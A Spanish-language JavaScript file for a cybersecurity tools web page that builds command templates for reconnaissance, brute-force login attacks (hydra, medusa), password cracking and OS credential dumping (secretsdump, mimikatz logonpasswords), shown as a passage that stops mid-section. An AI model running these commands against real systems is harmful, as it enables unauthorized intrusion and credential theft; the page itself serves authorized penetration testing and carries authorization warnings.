/**
 * MFH TOOLS - Script del apartado Herramientas de Ciberseguridad
 * Categorías: Reconnaissance | Credential Access | Initial Access
 */

'use strict';

// ============================================================
// TEMA
// ============================================================
(function() {
    var themeToggle = document.getElementById('themeToggle');
    var body = document.body;
    if (!themeToggle || !body) return;

    if (localStorage.getItem('theme') === 'light') {
        body.classList.add('light-mode');
        themeToggle.classList.remove('fa-sun');
        themeToggle.classList.add('fa-moon');
    }

    themeToggle.addEventListener('click', function() {
        body.classList.toggle('light-mode');
        var isLight = body.classList.contains('light-mode');
        localStorage.setItem('theme', isLight ? 'light' : 'dark');
        if (isLight) {
            themeToggle.classList.remove('fa-sun');
            themeToggle.classList.add('fa-moon');
        } else {
            themeToggle.classList.remove('fa-moon');
            themeToggle.classList.add('fa-sun');
        }
    });
})();

// ============================================================
// UTILIDADES
// ============================================================
function $(id) { return document.getElementById(id); }

function setOutput(id, html) {
    var el = document.getElementById(id);
    if (el) el.innerHTML = html;
}

function esc(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function now() { return new Date().toISOString(); }

function isValidDomain(d) {
    return /^([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$/i.test(d);
}

function isValidIP(ip) {
    if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) return false;
    return ip.split('.').every(function(n) {
        var x = parseInt(n, 10);
        return x >= 0 && x <= 255;
    });
}

function isValidMAC(mac) {
    return /^([0-9A-F]{2}[:-]){5}([0-9A-F]{2})$/i.test(mac);
}

function normalizeUrl(url) {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        return 'http://' + url;
    }
    return url;
}

function codeBlock(text) {
    return '<div style="background:#000;color:#0f0;padding:6px 10px;border-radius:5px;font-family:Courier New,monospace;font-size:0.75rem;border-left:3px solid #0f0;margin:4px 0;white-space:pre-wrap;word-break:break-all;">' + esc(text) + '</div>';
}

// ============================================================
// NAVEGACIÓN ENTRE TABS
// ============================================================
function showTool(tool) {
    var tabMap = {
        host: 'hostTab',
        identity: 'identityTab',
        network: 'networkTab',
        dns: 'dnsTab',
        webscan: 'webscanTab',
        vulnscan: 'vulnscanTab',
        webvuln: 'webvulnTab',
        bluetooth: 'bluetoothTab',
        radio: 'radioTab',
        wifi: 'wifiTab',
        creddump: 'creddumpTab',
        hashid: 'hashidTab',
        wordlist: 'wordlistTab',
        bruteforce: 'bruteforceTab',
        passcrack: 'passcrackTab',
        unsecured: 'unsecuredTab',
        wificred: 'wificredTab',
        keylogger: 'keyloggerTab',
        voip: 'voipTab',
        libnfc: 'libnfcTab',
        nfcmfclassic: 'nfcmfclassicTab',
        kerberoast: 'kerberoastTab',
        krbrelayx: 'krbrelayxTab',
        dnsrebind: 'dnsrebindTab',
        sqlmap: 'sqlmapTab',
        sqlninja: 'sqlninjaTab',
        sqlsus: 'sqlsusTab',
        jsqlinjection: 'jsqlinjectionTab',
        commix: 'commixTab',
        jbosswin: 'jbosswinTab',
        jbossautopwn: 'jbossautopwnTab',
        metasploit: 'metasploitTab'
    };
    var tabId = tabMap[tool];
    if (!tabId) return;
    var trigger = document.querySelector('button[data-bs-target="#' + tabId + '"]');
    if (trigger && typeof bootstrap !== 'undefined') {
        bootstrap.Tab.getOrCreateInstance(trigger).show();
    }
    var panel = document.getElementById('herramientas');
    if (panel) panel.scrollIntoView({ behavior: 'smooth' });
}

// ============================================================
// DESCARGA DE HERRAMIENTAS
// ============================================================
var AVAILABLE_TOOLS = [
    'host-information.js',
    'identity-information.js',
    'network-information.js',
    'dns-information.js',
    'web-scanning.js',
    'vulnerability-scanning.js',
    'web-vulnerability-scanning.js',
    'bluetooth-scanning.js',
    'radio-frequency-scanning.js',
    'wifi-scanning.js',
    'credential-dumping.js',
    'hash-identification.js',
    'wordlist-profiling.js',
    'brute-force.js',
    'password-cracking.js',
    'unsecured-credentials.js',
    'wifi-credential-access.js',
    'keylogger.js',
    'voip-credential-access.js',
    'libnfc.js',
    'nfc-mfclassic.js',
    'kerberoast.js',
    'krbrelayx.js',
    'dns-rebind.js',
    'sqlmap.js',
    'sqlninja.js',
    'sqlsus.js',
    'jsql-injection.js',
    'commix.js',
    'jboss-linux.js',
    'jboss-autopwn.js',
    'metasploit.js'
];

function downloadTool(filename) {
    if (!filename) return;

    if (AVAILABLE_TOOLS.indexOf(filename) === -1) {
        alert('WARN: tool "' + filename + '" no disponible aun.');
        return;
    }

    var link = document.createElement('a');
    link.href = 'tools/' + filename;
    link.download = filename;
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    setTimeout(function() {
        if (link.parentNode) link.parentNode.removeChild(link);
    }, 100);
}

// ============================================================
// HOST INFORMATION
// ============================================================
function runHostInfo() {
    var target = ($('hostTarget') ? $('hostTarget').value : '').trim();
    if (!target) { setOutput('hostResult', 'ERROR: ingresa un dominio o IP'); return; }
    setOutput('hostResult', 'Analizando host: ' + esc(target) + '...');
    setTimeout(function() {
        var clean = target.replace(/^https?:\/\//, '').split('/')[0];
        var isIP = isValidIP(clean);
        var isDomain = isValidDomain(clean);
        if (!isIP && !isDomain) { setOutput('hostResult', 'ERROR: formato invalido'); return; }
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  HOST INFORMATION REPORT');
        lines.push('  Target: ' + esc(clean));
        lines.push('  Tipo: ' + (isIP ? 'IP' : 'Dominio'));
        lines.push('  Fecha: ' + now());
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('Analisis de formato: OK');
        lines.push('');
        var susp = [];
        if (/\d{4,}/.test(clean)) susp.push('Secuencia numerica larga (posible DGA)');
        if (/\.(xyz|top|club|work|click|loan|bid|tk|ml|ga|cf)$/.test(clean)) susp.push('TLD sospechoso');
        if (clean.length > 50) susp.push('Dominio muy largo');
        lines.push('Analisis heuristico:');
        if (susp.length === 0) lines.push('  OK: sin patrones sospechosos');
        else susp.forEach(function(s) { lines.push('  WARN: ' + s); });
        lines.push('');
        lines.push('Navegador:');
        lines.push('  - UA: ' + esc(navigator.userAgent.substring(0, 50)) + '...');
        lines.push('  - Idioma: ' + esc(navigator.language));
        lines.push('  - Online: ' + (navigator.onLine ? 'SI' : 'NO'));
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('TIP: node tools/host-information.js --target ' + esc(clean));
        setOutput('hostResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// IDENTITY INFORMATION
// ============================================================
function runIdentityInfo() {
    var target = ($('identityTarget') ? $('identityTarget').value : '').trim();
    if (!target) { setOutput('identityResult', 'ERROR: ingresa un email o usuario'); return; }
    setOutput('identityResult', 'Analizando: ' + esc(target) + '...');
    setTimeout(function() {
        var isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(target);
        var parts = target.split('@');
        var user = parts[0] || target;
        var domain = parts[1] || '(sin dominio)';
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  IDENTITY INFORMATION REPORT');
        lines.push('  Target: ' + esc(target));
        lines.push('  Fecha: ' + now());
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('Info basica:');
        lines.push('  - Usuario: ' + esc(user));
        lines.push('  - Dominio: ' + esc(domain));
        lines.push('  - Email valido: ' + (isEmail ? 'SI' : 'NO'));
        lines.push('');
        lines.push('Analisis:');
        var warns = [];
        if (user.length < 4) warns.push('Usuario muy corto');
        if (/^(admin|root|test|user|info|support)$/i.test(user)) warns.push('Usuario generico');
        if (warns.length === 0) lines.push('  OK: sin patrones sospechosos');
        else warns.forEach(function(w) { lines.push('  WARN: ' + w); });
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('TIP: node tools/identity-information.js --target ' + esc(target));
        setOutput('identityResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// NETWORK INFORMATION
// ============================================================
function runNetworkInfo() {
    var target = ($('networkTarget') ? $('networkTarget').value : '').trim();
    if (!target) { setOutput('networkResult', 'ERROR: ingresa una IP o CIDR'); return; }
    setOutput('networkResult', 'Analizando: ' + esc(target) + '...');
    setTimeout(function() {
        var ip = target, cidr = null;
        if (target.indexOf('/') !== -1) {
            var p = target.split('/');
            ip = p[0];
            cidr = parseInt(p[1], 10);
        }
        if (!isValidIP(ip)) { setOutput('networkResult', 'ERROR: IP invalida'); return; }
        var parts = ip.split('.').map(function(n) { return parseInt(n, 10); });
        var isPrivate = ip.startsWith('10.') || ip.startsWith('192.168.') || /^172\.(1[6-9]|2\d|3[01])\./.test(ip) || ip.startsWith('127.');
        var clase = 'Desconocida';
        if (parts[0] >= 1 && parts[0] <= 126) clase = 'A';
        else if (parts[0] >= 128 && parts[0] <= 191) clase = 'B';
        else if (parts[0] >= 192 && parts[0] <= 223) clase = 'C';
        else if (parts[0] >= 224 && parts[0] <= 239) clase = 'D';
        else if (parts[0] >= 240) clase = 'E';
        var binary = parts.map(function(n) { return n.toString(2).padStart(8, '0'); }).join('.');
        var hex = parts.map(function(n) { return n.toString(16).padStart(2, '0'); }).join(':');
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  NETWORK INFORMATION REPORT');
        lines.push('  Target: ' + esc(target));
        lines.push('  Fecha: ' + now());
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('Clasificacion:');
        lines.push('  - IP: ' + esc(ip));
        lines.push('  - Clase: ' + clase);
        lines.push('  - Tipo: ' + (isPrivate ? 'PRIVADA' : 'PUBLICA'));
        lines.push('');
        lines.push('Representaciones:');
        lines.push('  - Binario: ' + binary);
        lines.push('  - Hex: ' + hex);
        if (cidr !== null) {
            lines.push('');
            lines.push('CIDR /' + cidr + ':');
            lines.push('  - Hosts: ' + Math.pow(2, 32 - cidr).toLocaleString());
        }
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('TIP: node tools/network-information.js --target ' + esc(target));
        setOutput('networkResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// DNS INFORMATION
// ============================================================
function runDnsInfo() {
    var target = ($('dnsTarget') ? $('dnsTarget').value : '').trim();
    var type = ($('dnsType') ? $('dnsType').value : 'A');
    if (!target) { setOutput('dnsResult', 'ERROR: ingresa un dominio'); return; }
    if (!isValidDomain(target)) { setOutput('dnsResult', 'ERROR: dominio invalido'); return; }
    setOutput('dnsResult', 'Consultando ' + esc(type) + '...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  DNS INFORMATION REPORT');
        lines.push('  Dominio: ' + esc(target));
        lines.push('  Tipo: ' + esc(type));
        lines.push('  Fecha: ' + now());
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('WARN: el navegador no puede hacer DNS lookup real.');
        lines.push('');
        lines.push('Consultas recomendadas:');
        lines.push('  nslookup -type=' + esc(type) + ' ' + esc(target));
        lines.push('  dig ' + esc(target) + ' ' + esc(type));
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('TIP: node tools/dns-information.js --target ' + esc(target) + ' --type ' + esc(type));
        setOutput('dnsResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// WEB SCANNING
// ============================================================
function runWebScanning() {
    var target = ($('webscanTarget') ? $('webscanTarget').value : '').trim();
    var tool = ($('webscanTool') ? $('webscanTool').value : 'all');
    if (!target) { setOutput('webscanResult', 'ERROR: ingresa una URL'); return; }
    setOutput('webscanResult', 'Generando comandos...');
    setTimeout(function() {
        var clean = normalizeUrl(target);
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  WEB SCANNING COMMANDS');
        lines.push('  Target: ' + esc(clean));
        lines.push('='.repeat(50));
        lines.push('');
        var cmds = [];
        if (tool === 'all' || tool === 'dirb') cmds.push({n: 'DIRB', i: 'sudo apt install dirb', c: 'dirb ' + clean + ' /usr/share/dirb/wordlists/common.txt -o dirb_results.txt'});
        if (tool === 'all' || tool === 'dirbuster') cmds.push({n: 'DirBuster', i: 'sudo apt install dirbuster', c: 'java -jar DirBuster-1.0-RC1.jar -H -u ' + clean});
        if (tool === 'all' || tool === 'gobuster') cmds.push({n: 'Gobuster', i: 'sudo apt install gobuster', c: 'gobuster dir -u ' + clean + ' -w /usr/share/wordlists/dirb/common.txt -x php,html,js'});
        cmds.forEach(function(c) {
            lines.push('[Tool] ' + c.n);
            lines.push('  Install: ' + c.i);
            lines.push(codeBlock(c.c));
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo escanea sitios con autorizacion');
        setOutput('webscanResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// VULNERABILITY SCANNING
// ============================================================
function runVulnScanning() {
    var target = ($('vulnscanTarget') ? $('vulnscanTarget').value : '').trim();
    var type = ($('vulnscanType') ? $('vulnscanType').value : 'all');
    if (!target) { setOutput('vulnscanResult', 'ERROR: ingresa una IP'); return; }
    setOutput('vulnscanResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  VULNERABILITY SCANNING');
        lines.push('  Target: ' + esc(target));
        lines.push('='.repeat(50));
        lines.push('');
        var allCmds = [
            {k: 'basic', n: 'Basico', c: 'nmap -sT ' + target},
            {k: 'stealth', n: 'SYN Stealth', c: 'sudo nmap -sS ' + target},
            {k: 'version', n: 'Versiones', c: 'sudo nmap -sV -sC ' + target},
            {k: 'os', n: 'SO', c: 'sudo nmap -O ' + target},
            {k: 'vuln', n: 'Vulnerabilidades', c: 'sudo nmap --script=vuln ' + target},
            {k: 'allports', n: 'Todos los puertos', c: 'sudo nmap -p- ' + target},
            {k: 'udp', n: 'UDP', c: 'sudo nmap -sU --top-ports 100 ' + target}
        ];
        var filtered = (type === 'all') ? allCmds : allCmds.filter(function(c) { return c.k === type; });
        lines.push('[Install] sudo apt install nmap zenmap');
        lines.push('');
        filtered.forEach(function(c) {
            lines.push('[Cmd] ' + c.n);
            lines.push(codeBlock(c.c));
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo escanea sistemas con autorizacion');
        setOutput('vulnscanResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// WEB VULNERABILITY SCANNING
// ============================================================
function runWebVulnScanning() {
    var target = ($('webvulnTarget') ? $('webvulnTarget').value : '').trim();
    var tool = ($('webvulnTool') ? $('webvulnTool').value : 'all');
    if (!target) { setOutput('webvulnResult', 'ERROR: ingresa una URL'); return; }
    setOutput('webvulnResult', 'Generando comandos...');
    setTimeout(function() {
        var clean = normalizeUrl(target);
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  WEB VULNERABILITY SCANNING');
        lines.push('  Target: ' + esc(clean));
        lines.push('='.repeat(50));
        lines.push('');
        if (tool === 'all' || tool === 'nikto') {
            lines.push('[Tool] Nikto');
            lines.push('  Install: sudo apt install nikto');
            lines.push(codeBlock('nikto -h ' + clean));
            lines.push(codeBlock('nikto -h ' + clean + ' -o nikto_report.html -F HTML -Tuning x'));
            lines.push('');
        }
        if (tool === 'all' || tool === 'zap') {
            lines.push('[Tool] OWASP ZAP');
            lines.push('  Install: sudo apt install zaproxy');
            lines.push(codeBlock('zaproxy'));
            lines.push(codeBlock('zap.sh -cmd -quickurl ' + clean + ' -quickout zap_report.html'));
            lines.push('');
        }
        lines.push('-'.repeat(50));
        lines.push('Test servers: testphp.vulnweb.com, juice-shop.herokuapp.com');
        lines.push('WARN: solo escanea sitios con autorizacion');
        setOutput('webvulnResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// BLUETOOTH SCANNING
// ============================================================
function runBluetoothScanning() {
    var target = ($('bluetoothTarget') ? $('bluetoothTarget').value : '').trim() || 'all';
    var tool = ($('bluetoothTool') ? $('bluetoothTool').value : 'all');
    if (target !== 'all' && !isValidMAC(target)) { setOutput('bluetoothResult', 'ERROR: MAC invalida'); return; }
    setOutput('bluetoothResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  BLUETOOTH SCANNING');
        lines.push('  Target: ' + esc(target));
        lines.push('='.repeat(50));
        lines.push('');
        var allTools = {
            bettercap: {n: 'Bettercap', i: 'sudo apt install bettercap', c: ['sudo bettercap -iface hci0', 'ble.recon on', 'ble.show']},
            bluetoothctl: {n: 'bluetoothctl', i: 'sudo apt install bluez bluez-tools', c: ['bluetoothctl', 'scan on', 'devices']},
            hcitool: {n: 'hcitool', i: 'sudo apt install bluez', c: ['sudo hcitool dev', 'sudo hcitool scan', 'sudo hcitool lescan']},
            btmon: {n: 'btmon', i: 'sudo apt install bluez', c: ['sudo btmon']},
            bluelog: {n: 'Bluelog', i: 'sudo apt install bluelog', c: ['sudo bluelog -i hci0 -o scan.log -v']}
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo escanea con autorizacion');
        setOutput('bluetoothResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// RADIO FREQUENCY
// ============================================================
function runRadioScanning() {
    var freq = ($('radioFreq') ? $('radioFreq').value : '').trim() || '100000000';
    var tool = ($('radioTool') ? $('radioTool').value : 'all');
    setOutput('radioResult', 'Generando comandos SDR...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  RADIO FREQUENCY');
        lines.push('  Frecuencia: ' + esc(freq) + ' Hz');
        lines.push('='.repeat(50));
        lines.push('');
        var allTools = {
            hackrf: {n: 'HackRF', i: 'sudo apt install hackrf', c: ['hackrf_info', 'hackrf_transfer -r capture.iq -f ' + freq + ' -s 2000000']},
            gnurdio: {n: 'GNU Radio', i: 'sudo apt install gnuradio', c: ['gnuradio-companion']},
            rtlsdr: {n: 'RTL-SDR', i: 'sudo apt install rtl-sdr', c: ['rtl_test', 'rtl_sdr -f ' + freq + ' -s 2000000 out.iq']},
            gqrx: {n: 'GQRX', i: 'sudo apt install gqrx-sdr', c: ['gqrx']},
            'sdr-sharp': {n: 'SDR#', i: 'Descargar de airspy.com', c: ['SDRSharp.exe']},
            'universal-radio-hacker': {n: 'URH', i: 'pip install urh', c: ['urh']}
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: transmitir sin licencia es ilegal');
        setOutput('radioResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// WIFI SCANNING
// ============================================================
function runWifiScanning() {
    var iface = ($('wifiIface') ? $('wifiIface').value : '').trim() || 'wlan0';
    var tool = ($('wifiTool') ? $('wifiTool').value : 'all');
    setOutput('wifiResult', 'Generando comandos WiFi...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  WIFI SCANNING');
        lines.push('  Interface: ' + esc(iface));
        lines.push('='.repeat(50));
        lines.push('');
        var allTools = {
            bettercap: {n: 'Bettercap', i: 'sudo apt install bettercap', c: ['sudo bettercap -iface ' + iface, 'wifi.recon on', 'wifi.show']},
            'sparrow-wifi': {n: 'Sparrow-WiFi', i: 'git clone https://github.com/ghostop14/sparrow-wifi', c: ['python3 sparrow-wifi.py']},
            kismet: {n: 'Kismet', i: 'sudo apt install kismet', c: ['sudo kismet -c ' + iface]},
            airodump: {n: 'Airodump-ng', i: 'sudo apt install aircrack-ng', c: ['sudo airmon-ng start ' + iface, 'sudo airodump-ng ' + iface + 'mon']},
            airoplay: {n: 'Aireplay-ng', i: 'sudo apt install aircrack-ng', c: ['sudo aireplay-ng --test ' + iface + 'mon']},
            wifite: {n: 'Wifite', i: 'git clone https://github.com/derv82/wifite2', c: ['sudo wifite']},
            wash: {n: 'Wash', i: 'sudo apt install reaver', c: ['sudo wash -i ' + iface + 'mon']},
            reaver: {n: 'Reaver', i: 'sudo apt install reaver', c: ['sudo reaver -i ' + iface + 'mon -b <BSSID> -vv']}
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo audita tu propia red o con autorizacion');
        setOutput('wifiResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// CREDENTIAL DUMPING
// ============================================================
function runCredentialDumping() {
    var target = ($('creddumpTarget') ? $('creddumpTarget').value : '').trim() || '/mnt/win';
    var tool = ($('creddumpTool') ? $('creddumpTool').value : 'all');
    setOutput('creddumpResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  OS CREDENTIAL DUMPING');
        lines.push('  Target: ' + esc(target));
        lines.push('='.repeat(50));
        lines.push('');
        var allTools = {
            samdump2: {n: 'samdump2', i: 'sudo apt install samdump2', c: ['samdump2 ' + target + '/SYSTEM ' + target + '/SAM > hashes.txt']},
            chntpw: {n: 'chntpw', i: 'sudo apt install chntpw', c: ['chntpw -l ' + target + '/SAM', 'chntpw -i ' + target + '/SAM']},
            creddump7: {n: 'creddump7', i: 'sudo apt install creddump7', c: ['pwdump.py ' + target + '/SYSTEM ' + target + '/SAM', 'lsadump.py ' + target + '/SYSTEM ' + target + '/SECURITY']},
            secretsdump: {n: 'secretsdump', i: 'pip install impacket', c: ['secretsdump.py -sam ' + target + '/SAM -system ' + target + '/SYSTEM -security ' + target + '/SECURITY LOCAL']},
            mimikatz: {n: 'Mimikatz', i: 'Descargar de GitHub', c: ['mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"']}
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo extrae credenciales con autorizacion');
        setOutput('creddumpResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// HASH IDENTIFICATION
// ============================================================
function runHashIdentification() {
    var hash = ($('hashidTarget') ? $('hashidTarget').value : '').trim();
    var tool = ($('hashidTool') ? $('hashidTool').value : 'all');
    if (!hash) { setOutput('hashidResult', 'ERROR: ingresa un hash'); return; }
    setOutput('hashidResult', 'Identificando hash...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  HASH IDENTIFICATION');
        lines.push('  Hash: ' + esc(hash));
        lines.push('  Longitud: ' + hash.length + ' caracteres');
        lines.push('='.repeat(50));
        lines.push('');
        var detected = 'Desconocido';
        if (/^\$2[aby]\$/.test(hash)) detected = 'bcrypt';
        else if (/^\$1\$/.test(hash)) detected = 'MD5 Crypt';
        else if (/^\$5\$/.test(hash)) detected = 'SHA-256 Crypt';
        else if (/^\$6\$/.test(hash)) detected = 'SHA-512 Crypt';
        else if (hash.length === 32) detected = 'MD5 / NTLM / MD4';
        else if (hash.length === 40) detected = 'SHA-1';
        else if (hash.length === 64) detected = 'SHA-256';
        else if (hash.length === 128) detected = 'SHA-512';
        lines.push('Tipo probable: ' + detected);
        lines.push('');
        var allTools = {
            hashid: {n: 'hashID', i: 'pip install hashid', c: ['hashid \'' + hash + '\'', 'hashid -m \'' + hash + '\'']},
            'hash-identifier': {n: 'Hash-Identifier', i: 'sudo apt install hash-identifier', c: ['hash-identifier ' + hash]},
            hashcrack: {n: 'hashcrack', i: 'pip install hashcrack-cli', c: ['hashcrack identify ' + hash]}
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('TIP: usa hashid -m para modo hashcat');
        setOutput('hashidResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// PASSWORD PROFILING
// ============================================================
function runWordlistProfiling() {
    var target = ($('wordlistTarget') ? $('wordlistTarget').value : '').trim();
    var tool = ($('wordlistTool') ? $('wordlistTool').value : 'all');
    if (!target) { setOutput('wordlistResult', 'ERROR: ingresa un nombre o URL'); return; }
    setOutput('wordlistResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  PASSWORD PROFILING');
        lines.push('  Target: ' + esc(target));
        lines.push('='.repeat(50));
        lines.push('');
        var allTools = {
            bopscrk: {n: 'bopscrk', i: 'pip install bopscrk', c: ['bopscrk -i', 'bopscrk -w "' + target + '" -o bopscrk_wordlist.txt']},
            cewl: {n: 'CeWL', i: 'sudo apt install cewl', c: ['cewl ' + target + ' -d 3 -m 5 -w cewl_wordlist.txt']},
            crunch: {n: 'Crunch', i: 'sudo apt install crunch', c: ['crunch 8 8 -f /usr/share/crunch/charset.lst numeric -o numeric.txt']},
            pack: {n: 'PACK', i: 'git clone https://github.com/iphelix/pack', c: ['python statsgen.py wordlist.txt']},
            rsmangler: {n: 'RSMangler', i: 'sudo apt install rsmangler', c: ['rsmangler -f base_words.txt -e -a -o mangled.txt']},
            seclists: {n: 'SecLists', i: 'sudo apt install seclists', c: ['ls /usr/share/seclists/Passwords/']},
            twofi: {n: 'Twofi', i: 'sudo apt install twofi', c: ['twofi -u ' + target + ' -o twitter_wordlist.txt']}
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo para auditorias con autorizacion');
        setOutput('wordlistResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// BRUTE FORCE
// ============================================================
function runBruteForce() {
    var target = ($('bruteforceTarget') ? $('bruteforceTarget').value : '').trim();
    var service = ($('bruteforceService') ? $('bruteforceService').value : 'ssh');
    var tool = ($('bruteforceTool') ? $('bruteforceTool').value : 'all');
    if (!target) { setOutput('bruteforceResult', 'ERROR: ingresa una IP o host'); return; }
    setOutput('bruteforceResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  BRUTE FORCE');
        lines.push('  Target: ' + esc(target));
        lines.push('  Servicio: ' + esc(service));
        lines.push('='.repeat(50));
        lines.push('');
        var allTools = {
            hydra: {n: 'Hydra', i: 'sudo apt install hydra', c: ['hydra -l admin -P /usr/share/wordlists/rockyou.txt ' + target + ' ' + service, 'hydra -L users.txt -P pass.txt ' + service + '://' + target]},
            'hydra-gtk': {n: 'Hydra-GTK', i: 'sudo apt install hydra-gtk', c: ['xhydra']},
            medusa: {n: 'Medusa', i: 'sudo apt install medusa', c: ['medusa -h ' + target + ' -u admin -P /usr/share/wordlists/rockyou.txt -M ' + service]},
            netexec: {n: 'NetExec', i: 'pip install netexec', c: ['nxc ' + service + ' ' + target + ' -u admin -p password', 'nxc ' + service + ' ' + target + ' -u users.txt -p pass.txt']},
            ncrack: {n: 'Ncrack', i: 'sudo apt install ncrack', c: ['ncrack -U users.txt -P pass.txt ' + service + '://' + target]},
            crowbar: {n: 'Crowbar', i: 'sudo apt install crowbar', c: ['crowbar -b rdp -s ' + target + '/32 -u admin -C pass.txt']},
            cat: {n: 'CAT (Context Application Tool)', i: 'Herramienta manual de pentest web', c: ['python3 cat.py -u http://' + target]}
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('bruteforceResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// PASSWORD CRACKING
// ============================================================
function runPasswordCracking() {
    var target = ($('passcrackTarget') ? $('passcrackTarget').value : '').trim();
    var type = ($('passcrackType') ? $('passcrackType').value : 'md5');
    var tool = ($('passcrackTool') ? $('passcrackTool').value : 'all');
    if (!target) { setOutput('passcrackResult', 'ERROR: ingresa un hash o archivo'); return; }
    setOutput('passcrackResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  PASSWORD CRACKING');
        lines.push('  Target: ' + esc(target));
        lines.push('  Tipo: ' + esc(type));
        lines.push('='.repeat(50));
        lines.push('');
        var hashcatModes = {md5: '0', ntlm: '1000', sha1: '100', sha256: '1400', bcrypt: '3200'};
        var allTools = {
            hashcat: {n: 'Hashcat', i: 'sudo apt install hashcat hashcat-data', c: ['hashcat -m ' + (hashcatModes[type] || '0') + ' -a 0 ' + target + ' /usr/share/wordlists/rockyou.txt', 'hashcat -m ' + (hashcatModes[type] || '0') + ' -a 3 ' + target + ' ?a?a?a?a?a?a']},
            john: {n: 'John the Ripper', i: 'sudo apt install john john-data', c: ['john --wordlist=/usr/share/wordlists/rockyou.txt ' + target, 'john --format=' + type + ' ' + target + ' --wordlist=rockyou.txt']},
